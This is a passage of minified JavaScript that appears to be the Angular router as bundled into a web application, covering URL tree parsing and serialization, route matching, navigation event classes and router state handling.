    i = new Set(),
    n = i.has(iu.HttpTransferCacheOptions);
  for (let { ɵproviders: r, ɵkind: o } of t) i.add(o), r.length && e.push(r);
  return qi([[], Mg(), i.has(iu.NoHttpTransferCache) || n ? [] : qg({}), e]);
}
var A = "primary",
  Pr = Symbol("RouteTitle"),
  lu = class {
    constructor(e) {
      this.params = e || {};
    }
    has(e) {
      return Object.prototype.hasOwnProperty.call(this.params, e);
    }
    get(e) {
      if (this.has(e)) {
        let i = this.params[e];
        return Array.isArray(i) ? i[0] : i;
      }
      return null;
    }
    getAll(e) {
      if (this.has(e)) {
        let i = this.params[e];
        return Array.isArray(i) ? i : [i];
      }
      return [];
    }
    get keys() {
      return Object.keys(this.params);
    }
  };
function fi(t) {
  return new lu(t);
}
function JM(t, e, i) {
  let n = i.path.split("/");
  if (
    n.length > t.length ||
    ("full" === i.pathMatch && (e.hasChildren() || n.length < t.length))
  )
    return null;
  let r = {};
  for (let o = 0; o < n.length; o++) {
    let s = n[o],
      a = t[o];
    if (s.startsWith(":")) r[s.substring(1)] = a;
    else if (s !== a.path) return null;
  }
  return { consumed: t.slice(0, n.length), posParams: r };
}
function eD(t, e) {
  if (t.length !== e.length) return !1;
  for (let i = 0; i < t.length; ++i) if (!gt(t[i], e[i])) return !1;
  return !0;
}
function gt(t, e) {
  let r,
    i = t ? uu(t) : void 0,
    n = e ? uu(e) : void 0;
  if (!i || !n || i.length != n.length) return !1;
  for (let o = 0; o < i.length; o++)
    if (((r = i[o]), !pm(t[r], e[r]))) return !1;
  return !0;
}
function uu(t) {
  return [...Object.keys(t), ...Object.getOwnPropertySymbols(t)];
}
function pm(t, e) {
  if (Array.isArray(t) && Array.isArray(e)) {
    if (t.length !== e.length) return !1;
    let i = [...t].sort(),
      n = [...e].sort();
    return i.every((r, o) => n[o] === r);
  }
  return t === e;
}
function gm(t) {
  return t.length > 0 ? t[t.length - 1] : null;
}
function Jt(t) {
  return _o(t) ? t : cr(t) ? ee(Promise.resolve(t)) : x(t);
}
var tD = { exact: vm, subset: _m },
  mm = { exact: nD, subset: iD, ignored: () => !0 };
function sm(t, e, i) {
  return (
    tD[i.paths](t.root, e.root, i.matrixParams) &&
    mm[i.queryParams](t.queryParams, e.queryParams) &&
    !("exact" === i.fragment && t.fragment !== e.fragment)
  );
}
function nD(t, e) {
  return gt(t, e);
}
function vm(t, e, i) {
  if (
    !yn(t.segments, e.segments) ||
    !qs(t.segments, e.segments, i) ||
    t.numberOfChildren !== e.numberOfChildren
  )
    return !1;
  for (let n in e.children)
    if (!t.children[n] || !vm(t.children[n], e.children[n], i)) return !1;
  return !0;
}
function iD(t, e) {
  return (
    Object.keys(e).length <= Object.keys(t).length &&
    Object.keys(e).every((i) => pm(t[i], e[i]))
  );
}
function _m(t, e, i) {
  return ym(t, e, e.segments, i);
}
function ym(t, e, i, n) {
  if (t.segments.length > i.length) {
    let r = t.segments.slice(0, i.length);
    return !(!yn(r, i) || e.hasChildren() || !qs(r, i, n));
  }
  if (t.segments.length === i.length) {
    if (!yn(t.segments, i) || !qs(t.segments, i, n)) return !1;
    for (let r in e.children)
      if (!t.children[r] || !_m(t.children[r], e.children[r], n)) return !1;
    return !0;
  }
  {
    let r = i.slice(0, t.segments.length),
      o = i.slice(t.segments.length);
    return (
      !!(yn(t.segments, r) && qs(t.segments, r, n) && t.children[A]) &&
      ym(t.children[A], e, o, n)
    );
  }
}
function qs(t, e, i) {
  return e.every((n, r) => mm[i](t[r].parameters, n.parameters));
}
var Zt = class {
    constructor(e = new W([], {}), i = {}, n = null) {
      (this.root = e), (this.queryParams = i), (this.fragment = n);
    }
    get queryParamMap() {
      return (
        (this._queryParamMap ??= fi(this.queryParams)), this._queryParamMap
      );
    }
    toString() {
      return sD.serialize(this);
    }
  },
  W = class {
    constructor(e, i) {
      (this.segments = e),
        (this.children = i),
        (this.parent = null),
        Object.values(i).forEach((n) => (n.parent = this));
    }
    hasChildren() {
      return this.numberOfChildren > 0;
    }
    get numberOfChildren() {
      return Object.keys(this.children).length;
    }
    toString() {
      return Ys(this);
    }
  },
  _n = class {
    constructor(e, i) {
      (this.path = e), (this.parameters = i);
    }
    get parameterMap() {
      return (this._parameterMap ??= fi(this.parameters)), this._parameterMap;
    }
    toString() {
      return wm(this);
    }
  };
function rD(t, e) {
  return yn(t, e) && t.every((i, n) => gt(i.parameters, e[n].parameters));
}
function yn(t, e) {
  return t.length === e.length && t.every((i, n) => i.path === e[n].path);
}
function oD(t, e) {
  let i = [];
  return (
    Object.entries(t.children).forEach(([n, r]) => {
      n === A && (i = i.concat(e(r, n)));
    }),
    Object.entries(t.children).forEach(([n, r]) => {
      n !== A && (i = i.concat(e(r, n)));
    }),
    i
  );
}
var Sr = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: () => new wr(), providedIn: "root" })),
      e
    );
  })(),
  wr = class {
    parse(e) {
      let i = new fu(e);
      return new Zt(
        i.parseRootSegment(),
        i.parseQueryParams(),
        i.parseFragment()
      );
    }
    serialize(e) {
      return `${`/${gr(e.root, !0)}`}${lD(e.queryParams)}${
        "string" == typeof e.fragment ? `#${aD(e.fragment)}` : ""
      }`;
    }
  },
  sD = new wr();
function Ys(t) {
  return t.segments.map((e) => wm(e)).join("/");
}
function gr(t, e) {
  if (!t.hasChildren()) return Ys(t);
  if (e) {
    let i = t.children[A] ? gr(t.children[A], !1) : "",
      n = [];
    return (
      Object.entries(t.children).forEach(([r, o]) => {
        r !== A && n.push(`${r}:${gr(o, !1)}`);
      }),
      n.length > 0 ? `${i}(${n.join("//")})` : i
    );
  }
  {
    let i = oD(t, (n, r) =>
      r === A ? [gr(t.children[A], !1)] : [`${r}:${gr(n, !1)}`]
    );
    return 1 === Object.keys(t.children).length && null != t.children[A]
      ? `${Ys(t)}/${i[0]}`
      : `${Ys(t)}/(${i.join("//")})`;
  }
}
function Cm(t) {
  return encodeURIComponent(t)
    .replace(/%40/g, "@")
    .replace(/%3A/gi, ":")
    .replace(/%24/g, "$")
    .replace(/%2C/gi, ",");
}
function Ws(t) {
  return Cm(t).replace(/%3B/gi, ";");
}
function aD(t) {
  return encodeURI(t);
}
function du(t) {
  return Cm(t)
    .replace(/\(/g, "%28")
    .replace(/\)/g, "%29")
    .replace(/%26/gi, "&");
}
function Zs(t) {
  return decodeURIComponent(t);
}
function am(t) {
  return Zs(t.replace(/\+/g, "%20"));
}
function wm(t) {
  return `${du(t.path)}${cD(t.parameters)}`;
}
function cD(t) {
  return Object.entries(t)
    .map(([e, i]) => `;${du(e)}=${du(i)}`)
    .join("");
}
function lD(t) {
  let e = Object.entries(t)
    .map(([i, n]) =>
      Array.isArray(n)
        ? n.map((r) => `${Ws(i)}=${Ws(r)}`).join("&")
        : `${Ws(i)}=${Ws(n)}`
    )
    .filter((i) => i);
  return e.length ? `?${e.join("&")}` : "";
}
var uD = /^[^\/()?;#]+/;
function ou(t) {
  let e = t.match(uD);
  return e ? e[0] : "";
}
var dD = /^[^\/()?;=#]+/;
function fD(t) {
  let e = t.match(dD);
  return e ? e[0] : "";
}
var hD = /^[^=?&#]+/;
function pD(t) {
  let e = t.match(hD);
  return e ? e[0] : "";
}
var gD = /^[^&#]+/;
function mD(t) {
  let e = t.match(gD);
  return e ? e[0] : "";
}
var fu = class {
  constructor(e) {
    (this.url = e), (this.remaining = e);
  }
  parseRootSegment() {
    return (
      this.consumeOptional("/"),
      "" === this.remaining ||
      this.peekStartsWith("?") ||
      this.peekStartsWith("#")
        ? new W([], {})
        : new W([], this.parseChildren())
    );
  }
  parseQueryParams() {
    let e = {};
    if (this.consumeOptional("?"))
      do {
        this.parseQueryParam(e);
      } while (this.consumeOptional("&"));
    return e;
  }
  parseFragment() {
    return this.consumeOptional("#")
      ? decodeURIComponent(this.remaining)
      : null;
  }
  parseChildren() {
    if ("" === this.remaining) return {};
    this.consumeOptional("/");
    let e = [];
    for (
      this.peekStartsWith("(") || e.push(this.parseSegment());
      this.peekStartsWith("/") &&
      !this.peekStartsWith("//") &&
      !this.peekStartsWith("/(");

    )
      this.capture("/"), e.push(this.parseSegment());
    let i = {};
    this.peekStartsWith("/(") &&
      (this.capture("/"), (i = this.parseParens(!0)));
    let n = {};
    return (
      this.peekStartsWith("(") && (n = this.parseParens(!1)),
      (e.length > 0 || Object.keys(i).length > 0) && (n[A] = new W(e, i)),
      n
    );
  }
  parseSegment() {
    let e = ou(this.remaining);
    if ("" === e && this.peekStartsWith(";")) throw new D(4009, !1);
    return this.capture(e), new _n(Zs(e), this.parseMatrixParams());
  }
  parseMatrixParams() {
    let e = {};
    for (; this.consumeOptional(";"); ) this.parseParam(e);
    return e;
  }
  parseParam(e) {
    let i = fD(this.remaining);
    if (!i) return;
    this.capture(i);
    let n = "";
    if (this.consumeOptional("=")) {
      let r = ou(this.remaining);
      r && ((n = r), this.capture(n));
    }
    e[Zs(i)] = Zs(n);
  }
  parseQueryParam(e) {
    let i = pD(this.remaining);
    if (!i) return;
    this.capture(i);
    let n = "";
    if (this.consumeOptional("=")) {
      let s = mD(this.remaining);
      s && ((n = s), this.capture(n));
    }
    let r = am(i),
      o = am(n);
    if (e.hasOwnProperty(r)) {
      let s = e[r];
      Array.isArray(s) || ((s = [s]), (e[r] = s)), s.push(o);
    } else e[r] = o;
  }
  parseParens(e) {
    let i = {};
    for (
      this.capture("(");
      !this.consumeOptional(")") && this.remaining.length > 0;

    ) {
      let o,
        n = ou(this.remaining),
        r = this.remaining[n.length];
      if ("/" !== r && ")" !== r && ";" !== r) throw new D(4010, !1);
      n.indexOf(":") > -1
        ? ((o = n.slice(0, n.indexOf(":"))), this.capture(o), this.capture(":"))
        : e && (o = A);
      let s = this.parseChildren();
      (i[o] = 1 === Object.keys(s).length ? s[A] : new W([], s)),
        this.consumeOptional("//");
    }
    return i;
  }
  peekStartsWith(e) {
    return this.remaining.startsWith(e);
  }
  consumeOptional(e) {
    return (
      !!this.peekStartsWith(e) &&
      ((this.remaining = this.remaining.substring(e.length)), !0)
    );
  }
  capture(e) {
    if (!this.consumeOptional(e)) throw new D(4011, !1);
  }
};
function bm(t) {
  return t.segments.length > 0 ? new W([], { [A]: t }) : t;
}
function Mm(t) {
  let e = {};
  for (let [n, r] of Object.entries(t.children)) {
    let o = Mm(r);
    if (n === A && 0 === o.segments.length && o.hasChildren())
      for (let [s, a] of Object.entries(o.children)) e[s] = a;
    else (o.segments.length > 0 || o.hasChildren()) && (e[n] = o);
  }
  return vD(new W(t.segments, e));
}
function vD(t) {
  if (1 === t.numberOfChildren && t.children[A]) {
    let e = t.children[A];
    return new W(t.segments.concat(e.segments), e.children);
  }
  return t;
}
function hi(t) {
  return t instanceof Zt;
}
function _D(t, e, i = null, n = null) {
  return xm(Dm(t), e, i, n);
}
function Dm(t) {
  let e;
  let n = (function i(o) {
      let s = {};
      for (let c of o.children) {
        let l = i(c);
        s[c.outlet] = l;
      }
      let a = new W(o.url, s);
      return o === t && (e = a), a;
    })(t.root),
    r = bm(n);
  return e ?? r;
}
function xm(t, e, i, n) {
  let r = t;
  for (; r.parent; ) r = r.parent;
  if (0 === e.length) return su(r, r, r, i, n);
  let o = yD(e);
  if (o.toRoot()) return su(r, r, new W([], {}), i, n);
  let s = CD(o, r, t),
    a = s.processChildren
      ? _r(s.segmentGroup, s.index, o.commands)
      : Om(s.segmentGroup, s.index, o.commands);
  return su(r, s.segmentGroup, a, i, n);
}
function Qs(t) {
  return "object" == typeof t && null != t && !t.outlets && !t.segmentPath;
}
function br(t) {
  return "object" == typeof t && null != t && t.outlets;
}
function su(t, e, i, n, r) {
  let s,
    o = {};
  n &&
    Object.entries(n).forEach(([c, l]) => {
      o[c] = Array.isArray(l) ? l.map((u) => `${u}`) : `${l}`;
    }),
    (s = t === e ? i : Em(t, e, i));
  let a = bm(Mm(s));
  return new Zt(a, o, r);
}
function Em(t, e, i) {
  let n = {};
  return (
    Object.entries(t.children).forEach(([r, o]) => {
      n[r] = o === e ? i : Em(o, e, i);
    }),
    new W(t.segments, n)
  );
}
var Ks = class {
  constructor(e, i, n) {
    if (
      ((this.isAbsolute = e),
      (this.numberOfDoubleDots = i),
      (this.commands = n),
      e && n.length > 0 && Qs(n[0]))
    )
      throw new D(4003, !1);
    let r = n.find(br);
    if (r && r !== gm(n)) throw new D(4004, !1);
  }
  toRoot() {
    return (
      this.isAbsolute && 1 === this.commands.length && "/" == this.commands[0]
    );
  }
};
function yD(t) {
  if ("string" == typeof t[0] && 1 === t.length && "/" === t[0])
    return new Ks(!0, 0, t);
  let e = 0,
    i = !1,
    n = t.reduce((r, o, s) => {
      if ("object" == typeof o && null != o) {
        if (o.outlets) {
          let a = {};
          return (
            Object.entries(o.outlets).forEach(([c, l]) => {
              a[c] = "string" == typeof l ? l.split("/") : l;
            }),
            [...r, { outlets: a }]
          );
        }
        if (o.segmentPath) return [...r, o.segmentPath];
      }
      return "string" != typeof o
        ? [...r, o]
        : 0 === s
        ? (o.split("/").forEach((a, c) => {
            (0 == c && "." === a) ||
              (0 == c && "" === a
                ? (i = !0)
                : ".." === a
                ? e++
                : "" != a && r.push(a));
          }),
          r)
        : [...r, o];
    }, []);
  return new Ks(i, e, n);
}
var ui = class {
  constructor(e, i, n) {
    (this.segmentGroup = e), (this.processChildren = i), (this.index = n);
  }
};
function CD(t, e, i) {
  if (t.isAbsolute) return new ui(e, !0, 0);
  if (!i) return new ui(e, !1, NaN);
  if (null === i.parent) return new ui(i, !0, 0);
  let n = Qs(t.commands[0]) ? 0 : 1;
  return wD(i, i.segments.length - 1 + n, t.numberOfDoubleDots);
}
function wD(t, e, i) {
  let n = t,
    r = e,
    o = i;
  for (; o > r; ) {
    if (((o -= r), (n = n.parent), !n)) throw new D(4005, !1);
    r = n.segments.length;
  }
  return new ui(n, !1, r - o);
}
function bD(t) {
  return br(t[0]) ? t[0].outlets : { [A]: t };
}
function Om(t, e, i) {
  if (((t ??= new W([], {})), 0 === t.segments.length && t.hasChildren()))
    return _r(t, e, i);
  let n = MD(t, e, i),
    r = i.slice(n.commandIndex);
  if (n.match && n.pathIndex < t.segments.length) {
    let o = new W(t.segments.slice(0, n.pathIndex), {});
    return (
      (o.children[A] = new W(t.segments.slice(n.pathIndex), t.children)),
      _r(o, 0, r)
    );
  }
  return n.match && 0 === r.length
    ? new W(t.segments, {})
    : n.match && !t.hasChildren()
    ? hu(t, e, i)
    : n.match
    ? _r(t, 0, r)
    : hu(t, e, i);
}
function _r(t, e, i) {
  if (0 === i.length) return new W(t.segments, {});
  {
    let n = bD(i),
      r = {};
    if (
      Object.keys(n).some((o) => o !== A) &&
      t.children[A] &&
      1 === t.numberOfChildren &&
      0 === t.children[A].segments.length
    ) {
      let o = _r(t.children[A], e, i);
      return new W(t.segments, o.children);
    }
    return (
      Object.entries(n).forEach(([o, s]) => {
        "string" == typeof s && (s = [s]),
          null !== s && (r[o] = Om(t.children[o], e, s));
      }),
      Object.entries(t.children).forEach(([o, s]) => {
        void 0 === n[o] && (r[o] = s);
      }),
      new W(t.segments, r)
    );
  }
}
function MD(t, e, i) {
  let n = 0,
    r = e,
    o = { match: !1, pathIndex: 0, commandIndex: 0 };
  for (; r < t.segments.length; ) {
    if (n >= i.length) return o;
    let s = t.segments[r],
      a = i[n];
    if (br(a)) break;
    let c = `${a}`,
      l = n < i.length - 1 ? i[n + 1] : null;
    if (r > 0 && void 0 === c) break;
    if (c && l && "object" == typeof l && void 0 === l.outlets) {
      if (!lm(c, l, s)) return o;
      n += 2;
    } else {
      if (!lm(c, {}, s)) return o;
      n++;
    }
    r++;
  }
  return { match: !0, pathIndex: r, commandIndex: n };
}
function hu(t, e, i) {
  let n = t.segments.slice(0, e),
    r = 0;
  for (; r < i.length; ) {
    let o = i[r];
    if (br(o)) {
      let c = DD(o.outlets);
      return new W(n, c);
    }
    if (0 === r && Qs(i[0])) {
      let c = t.segments[e];
      n.push(new _n(c.path, cm(i[0]))), r++;
      continue;
    }
    let s = br(o) ? o.outlets[A] : `${o}`,
      a = r < i.length - 1 ? i[r + 1] : null;
    s && a && Qs(a)
      ? (n.push(new _n(s, cm(a))), (r += 2))
      : (n.push(new _n(s, {})), r++);
  }
  return new W(n, {});
}
function DD(t) {
  let e = {};
  return (
    Object.entries(t).forEach(([i, n]) => {
      "string" == typeof n && (n = [n]),
        null !== n && (e[i] = hu(new W([], {}), 0, n));
    }),
    e
  );
}
function cm(t) {
  let e = {};
  return Object.entries(t).forEach(([i, n]) => (e[i] = `${n}`)), e;
}
function lm(t, e, i) {
  return t == i.path && gt(e, i.parameters);
}
var yr = "imperative",
  pe = (function (t) {
    return (
      (t[(t.NavigationStart = 0)] = "NavigationStart"),
      (t[(t.NavigationEnd = 1)] = "NavigationEnd"),
      (t[(t.NavigationCancel = 2)] = "NavigationCancel"),
      (t[(t.NavigationError = 3)] = "NavigationError"),
      (t[(t.RoutesRecognized = 4)] = "RoutesRecognized"),
      (t[(t.ResolveStart = 5)] = "ResolveStart"),
      (t[(t.ResolveEnd = 6)] = "ResolveEnd"),
      (t[(t.GuardsCheckStart = 7)] = "GuardsCheckStart"),
      (t[(t.GuardsCheckEnd = 8)] = "GuardsCheckEnd"),
      (t[(t.RouteConfigLoadStart = 9)] = "RouteConfigLoadStart"),
      (t[(t.RouteConfigLoadEnd = 10)] = "RouteConfigLoadEnd"),
      (t[(t.ChildActivationStart = 11)] = "ChildActivationStart"),
      (t[(t.ChildActivationEnd = 12)] = "ChildActivationEnd"),
      (t[(t.ActivationStart = 13)] = "ActivationStart"),
      (t[(t.ActivationEnd = 14)] = "ActivationEnd"),
      (t[(t.Scroll = 15)] = "Scroll"),
      (t[(t.NavigationSkipped = 16)] = "NavigationSkipped"),
      t
    );
  })(pe || {}),
  $e = class {
    constructor(e, i) {
      (this.id = e), (this.url = i);
    }
  },
  pi = class extends $e {
    constructor(e, i, n = "imperative", r = null) {
      super(e, i),
        (this.type = pe.NavigationStart),
        (this.navigationTrigger = n),
        (this.restoredState = r);
    }
    toString() {
      return `NavigationStart(id: ${this.id}, url: '${this.url}')`;
    }
  },
  mt = class extends $e {
    constructor(e, i, n) {
      super(e, i), (this.urlAfterRedirects = n), (this.type = pe.NavigationEnd);
    }
    toString() {
      return `NavigationEnd(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}')`;
    }
  },
  Re = (function (t) {
    return (
      (t[(t.Redirect = 0)] = "Redirect"),
      (t[(t.SupersededByNewNavigation = 1)] = "SupersededByNewNavigation"),
      (t[(t.NoDataFromResolver = 2)] = "NoDataFromResolver"),
      (t[(t.GuardRejected = 3)] = "GuardRejected"),
      t
    );
  })(Re || {}),
  Xs = (function (t) {
    return (
      (t[(t.IgnoredSameUrlNavigation = 0)] = "IgnoredSameUrlNavigation"),
      (t[(t.IgnoredByUrlHandlingStrategy = 1)] =
        "IgnoredByUrlHandlingStrategy"),
      t
    );
  })(Xs || {}),
  Qt = class extends $e {
    constructor(e, i, n, r) {
      super(e, i),
        (this.reason = n),
        (this.code = r),
        (this.type = pe.NavigationCancel);
    }
    toString() {
      return `NavigationCancel(id: ${this.id}, url: '${this.url}')`;
    }
  },
  Kt = class extends $e {
    constructor(e, i, n, r) {
      super(e, i),
        (this.reason = n),
        (this.code = r),
        (this.type = pe.NavigationSkipped);
    }
  },
  Mr = class extends $e {
    constructor(e, i, n, r) {
      super(e, i),
        (this.error = n),
        (this.target = r),
        (this.type = pe.NavigationError);
    }
    toString() {
      return `NavigationError(id: ${this.id}, url: '${this.url}', error: ${this.error})`;
    }
  },
  Js = class extends $e {
    constructor(e, i, n, r) {
      super(e, i),
        (this.urlAfterRedirects = n),
        (this.state = r),
        (this.type = pe.RoutesRecognized);
    }
    toString() {
      return `RoutesRecognized(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`;
    }
  },
  pu = class extends $e {
    constructor(e, i, n, r) {
      super(e, i),
        (this.urlAfterRedirects = n),
        (this.state = r),
        (this.type = pe.GuardsCheckStart);
    }
    toString() {
      return `GuardsCheckStart(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`;
    }
  },
  gu = class extends $e {
    constructor(e, i, n, r, o) {
      super(e, i),
        (this.urlAfterRedirects = n),
        (this.state = r),
        (this.shouldActivate = o),
        (this.type = pe.GuardsCheckEnd);
    }
    toString() {
      return `GuardsCheckEnd(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state}, shouldActivate: ${this.shouldActivate})`;
    }
  },
  mu = class extends $e {
    constructor(e, i, n, r) {
      super(e, i),
        (this.urlAfterRedirects = n),
        (this.state = r),
        (this.type = pe.ResolveStart);
    }
    toString() {
      return `ResolveStart(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`;
    }
  },
  vu = class extends $e {
    constructor(e, i, n, r) {
      super(e, i),
        (this.urlAfterRedirects = n),
        (this.state = r),
        (this.type = pe.ResolveEnd);
    }
    toString() {
      return `ResolveEnd(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`;
    }
  },
  _u = class {
    constructor(e) {
      (this.route = e), (this.type = pe.RouteConfigLoadStart);
    }
    toString() {
      return `RouteConfigLoadStart(path: ${this.route.path})`;
    }
  },
  yu = class {
    constructor(e) {
      (this.route = e), (this.type = pe.RouteConfigLoadEnd);
    }
    toString() {
      return `RouteConfigLoadEnd(path: ${this.route.path})`;
    }
  },
  Cu = class {
    constructor(e) {
      (this.snapshot = e), (this.type = pe.ChildActivationStart);
    }
    toString() {
      return `ChildActivationStart(path: '${
        (this.snapshot.routeConfig && this.snapshot.routeConfig.path) || ""
      }')`;
    }
  },
  wu = class {
    constructor(e) {
      (this.snapshot = e), (this.type = pe.ChildActivationEnd);
    }
    toString() {
      return `ChildActivationEnd(path: '${
        (this.snapshot.routeConfig && this.snapshot.routeConfig.path) || ""
      }')`;
    }
  },
  bu = class {
    constructor(e) {
      (this.snapshot = e), (this.type = pe.ActivationStart);
    }
    toString() {
      return `ActivationStart(path: '${
        (this.snapshot.routeConfig && this.snapshot.routeConfig.path) || ""
      }')`;
    }
  },
  Mu = class {
    constructor(e) {
      (this.snapshot = e), (this.type = pe.ActivationEnd);
    }
    toString() {
      return `ActivationEnd(path: '${
        (this.snapshot.routeConfig && this.snapshot.routeConfig.path) || ""
      }')`;
    }
  },
  ea = class {
    constructor(e, i, n) {
      (this.routerEvent = e),
        (this.position = i),
        (this.anchor = n),
        (this.type = pe.Scroll);
    }
    toString() {
      let e = this.position ? `${this.position[0]}, ${this.position[1]}` : null;
      return `Scroll(anchor: '${this.anchor}', position: '${e}')`;
    }
  },
  Dr = class {},
  xr = class {
    constructor(e) {
      this.url = e;
    }
  },
  Du = class {
    constructor() {
      (this.outlet = null),
        (this.route = null),
        (this.injector = null),
        (this.children = new Tr()),
        (this.attachRef = null);
    }
  },
  Tr = (() => {
    let e = class e {
      constructor() {
        this.contexts = new Map();
      }
      onChildOutletCreated(n, r) {
        let o = this.getOrCreateContext(n);
        (o.outlet = r), this.contexts.set(n, o);
      }
      onChildOutletDestroyed(n) {
        let r = this.getContext(n);
        r && ((r.outlet = null), (r.attachRef = null));
      }
      onOutletDeactivated() {
        let n = this.contexts;
        return (this.contexts = new Map()), n;
      }
      onOutletReAttached(n) {
        this.contexts = n;
      }
      getOrCreateContext(n) {
        let r = this.getContext(n);
        return r || ((r = new Du()), this.contexts.set(n, r)), r;
      }
      getContext(n) {
        return this.contexts.get(n) || null;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  ta = class {
    constructor(e) {
      this._root = e;
    }
    get root() {
      return this._root.value;
    }
    parent(e) {
      let i = this.pathFromRoot(e);
      return i.length > 1 ? i[i.length - 2] : null;
    }
    children(e) {
      let i = xu(e, this._root);
      return i ? i.children.map((n) => n.value) : [];
    }
    firstChild(e) {
      let i = xu(e, this._root);
      return i && i.children.length > 0 ? i.children[0].value : null;
    }
    siblings(e) {
      let i = Eu(e, this._root);
      return i.length < 2
        ? []
        : i[i.length - 2].children.map((r) => r.value).filter((r) => r !== e);
    }
    pathFromRoot(e) {
      return Eu(e, this._root).map((i) => i.value);
    }
  };
function xu(t, e) {
  if (t === e.value) return e;
  for (let i of e.children) {
    let n = xu(t, i);
    if (n) return n;
  }
  return null;
}
function Eu(t, e) {
  if (t === e.value) return [e];
  for (let i of e.children) {
    let n = Eu(t, i);
    if (n.length) return n.unshift(e), n;
  }
  return [];
}
var Ae = class {
  constructor(e, i) {
    (this.value = e), (this.children = i);
  }
  toString() {
    return `TreeNode(${this.value})`;
  }
};
function li(t) {
  let e = {};
  return t && t.children.forEach((i) => (e[i.value.outlet] = i)), e;
}
var na = class extends ta {
  constructor(e, i) {
    super(e), (this.snapshot = i), Fu(this, e);
  }
  toString() {
    return this.snapshot.toString();
  }
};
function Im(t) {
  let e = xD(t),
    i = new le([new _n("", {})]),
    n = new le({}),
    r = new le({}),
    o = new le({}),
    s = new le(""),
    a = new Cn(i, n, o, s, r, A, t, e.root);
  return (a.snapshot = e.root), new na(new Ae(a, []), e);
}
function xD(t) {
  let o = new Er([], {}, {}, "", {}, A, t, null, {});
  return new ia("", new Ae(o, []));
}
var Cn = class {
  constructor(e, i, n, r, o, s, a, c) {
    (this.urlSubject = e),
      (this.paramsSubject = i),
      (this.queryParamsSubject = n),
      (this.fragmentSubject = r),
      (this.dataSubject = o),
      (this.outlet = s),
      (this.component = a),
      (this._futureSnapshot = c),
      (this.title = this.dataSubject?.pipe(F((l) => l[Pr])) ?? x(void 0)),
      (this.url = e),
      (this.params = i),
      (this.queryParams = n),
      (this.fragment = r),
      (this.data = o);
  }
  get routeConfig() {
    return this._futureSnapshot.routeConfig;
  }
  get root() {
    return this._routerState.root;
  }
  get parent() {
    return this._routerState.parent(this);
  }
  get firstChild() {
    return this._routerState.firstChild(this);
  }
  get children() {
    return this._routerState.children(this);
  }
  get pathFromRoot() {
    return this._routerState.pathFromRoot(this);
  }
  get paramMap() {
    return (
      (this._paramMap ??= this.params.pipe(F((e) => fi(e)))), this._paramMap
    );
  }
  get queryParamMap() {
    return (
      (this._queryParamMap ??= this.queryParams.pipe(F((e) => fi(e)))),
      this._queryParamMap
    );
  }
  toString() {
    return this.snapshot
      ? this.snapshot.toString()
      : `Future(${this._futureSnapshot})`;
  }
};
function ku(t, e, i = "emptyOnly") {
  let n,
    { routeConfig: r } = t;
  return (
    (n =
      null === e ||
      ("always" !== i &&
        "" !== r?.path &&
        (e.component || e.routeConfig?.loadComponent))
        ? {
            params: C({}, t.params),
            data: C({}, t.data),
            resolve: C(C({}, t.data), t._resolvedData ?? {}),
          }
        : {
            params: C(C({}, e.params), t.params),
            data: C(C({}, e.data), t.data),
            resolve: C(C(C(C({}, t.data), e.data), r?.data), t._resolvedData),
          }),
    r && Sm(r) && (n.resolve[Pr] = r.title),
    n
  );
}
var Er = class {
    get title() {
      return this.data?.[Pr];
    }
    constructor(e, i, n, r, o, s, a, c, l) {
      (this.url = e),
        (this.params = i),
        (this.queryParams = n),
        (this.fragment = r),
        (this.data = o),
        (this.outlet = s),
        (this.component = a),
        (this.routeConfig = c),
        (this._resolve = l);
    }
    get root() {
      return this._routerState.root;
    }
    get parent() {
      return this._routerState.parent(this);
    }
    get firstChild() {
      return this._routerState.firstChild(this);
    }
    get children() {
      return this._routerState.children(this);
    }
    get pathFromRoot() {
      return this._routerState.pathFromRoot(this);
    }
    get paramMap() {
      return (this._paramMap ??= fi(this.params)), this._paramMap;
    }
    get queryParamMap() {
      return (
        (this._queryParamMap ??= fi(this.queryParams)), this._queryParamMap
      );
    }
    toString() {
      return `Route(url:'${this.url
        .map((n) => n.toString())
        .join("/")}', path:'${this.routeConfig ? this.routeConfig.path : ""}')`;
    }
  },
  ia = class extends ta {
    constructor(e, i) {
      super(i), (this.url = e), Fu(this, i);
    }
    toString() {
      return Pm(this._root);
    }
  };
function Fu(t, e) {
  (e.value._routerState = t), e.children.forEach((i) => Fu(t, i));
}
function Pm(t) {
  let e = t.children.length > 0 ? ` { ${t.children.map(Pm).join(", ")} } ` : "";
  return `${t.value}${e}`;
}
function au(t) {
  if (t.snapshot) {
    let e = t.snapshot,
      i = t._futureSnapshot;
    (t.snapshot = i),
      gt(e.queryParams, i.queryParams) ||
        t.queryParamsSubject.next(i.queryParams),
      e.fragment !== i.fragment && t.fragmentSubject.next(i.fragment),
      gt(e.params, i.params) || t.paramsSubject.next(i.params),
      eD(e.url, i.url) || t.urlSubject.next(i.url),
      gt(e.data, i.data) || t.dataSubject.next(i.data);
  } else
    (t.snapshot = t._futureSnapshot),
      t.dataSubject.next(t._futureSnapshot.data);
}
function Ou(t, e) {
  let i = gt(t.params, e.params) && rD(t.url, e.url),
    n = !t.parent != !e.parent;
  return i && !n && (!t.parent || Ou(t.parent, e.parent));
}
function Sm(t) {
  return "string" == typeof t.title || null === t.title;
}
var ED = (() => {
    let e = class e {
      constructor() {
        (this.activated = null),
          (this._activatedRoute = null),
          (this.name = A),
          (this.activateEvents = new K()),
          (this.deactivateEvents = new K()),
          (this.attachEvents = new K()),
          (this.detachEvents = new K()),
          (this.parentContexts = v(Tr)),
          (this.location = v(Ue)),
          (this.changeDetector = v(Ot)),
          (this.environmentInjector = v(Oe)),
          (this.inputBinder = v(ca, { optional: !0 })),
          (this.supportsBindingToComponentInputs = !0);
      }
      get activatedComponentRef() {
        return this.activated;
      }
